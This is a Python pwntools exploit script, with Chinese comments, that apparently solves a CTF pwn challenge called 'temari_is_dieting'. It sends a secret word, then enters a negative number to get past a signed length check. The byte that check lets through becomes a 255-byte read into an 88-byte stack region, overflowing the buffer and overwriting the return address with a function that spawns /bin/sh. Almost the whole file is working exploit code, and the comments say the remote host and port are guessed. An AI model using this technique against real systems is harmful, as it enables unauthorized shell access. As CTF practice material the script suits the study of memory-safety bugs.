from pwn import *

context.arch = 'amd64'

# 注意：題目資料夾裡沒有附遠端連線資訊（不像 pwn101 / cheer_for_kotone 的 README 有寫明）。
# 這裡沿用同一系列的連線模式（ctf.adl.tw，port 依序 10000 -> 10001 -> ...）往下推一號，
# 純屬推測，連線前請自行確認/修正 HOST、PORT。
HOST, PORT = 'ctf.adl.tw', 10005

# --- 二進位裡找出來的關鍵常數（見 temari_is_dieting_writeup.md） ---
WIN_FUNC = 0x4012dc          # luna_say_maybe() -> puts(banner); execve("/bin/sh", NULL, NULL)
SECRET   = b'salad'          # main() 第一關：strcmp(buf1, "salad") 必須相等

BUF2_SIZE = 0x50             # 第二個 buffer: char buf2[0x50]，位於 rbp-0x50
SAVED_RBP = 0x8              # 64-bit 下 saved rbp 固定 8 bytes
OFFSET = BUF2_SIZE + SAVED_RBP   # = 0x58 (88)，buf2 起點到 return address 的距離

# 關鍵漏洞：
#   scanf("%d", &n)                 ; n 存在 rbp-0x54
#   if (n > 0x10) exit(1);          ; 有號數比較 (jle)，n 為負數也會通過！
#   len = to_ulong(n);              ; to_ulong 只取 n 的最低位元組 (unsigned char)，0..255
#   read(0, buf2, len);             ; buf2 只有 0x50 bytes，但 len 可被操縱到遠大於它
#
# 只要讓 n 是負數，"n <= 16" 的有號數檢查永遠成立（繞過上限檢查），
# 但 to_ulong() 回傳的是 n 的最低一個 byte（0..255），可以藉由挑選 n
# 讓這個 byte 落在我們想要的任意長度（例如 n = -1 -> 0xFF -> len = 255）。
# 於是「檢查用的 n（有號、<=16）」跟「實際拿來 read() 的 len（無號、最高到 255）」
# 產生落差，造就可控長度遠超過 buf2 大小的 stack buffer overflow。

p = remote(HOST, PORT, timeout=10)

# 第一關：salad 密語
p.recvuntil(b'ari: ')
p.sendline(SECRET)

# 第二關：輸入負數繞過長度上限檢查
p.recvuntil(b'order?: ')
p.sendline(b'-1')          # to_ulong(-1) = 0xFF = 255，遠大於 buf2(0x50) + saved_rbp(8) = 88

# 第三關：真正觸發 overflow 的 payload
p.recvuntil(b'order: ')
payload = b'A' * OFFSET          # 填滿 buf2 + saved rbp
payload += p64(WIN_FUNC)          # 蓋 return address -> luna_say_maybe()
p.send(payload)

p.interactive()
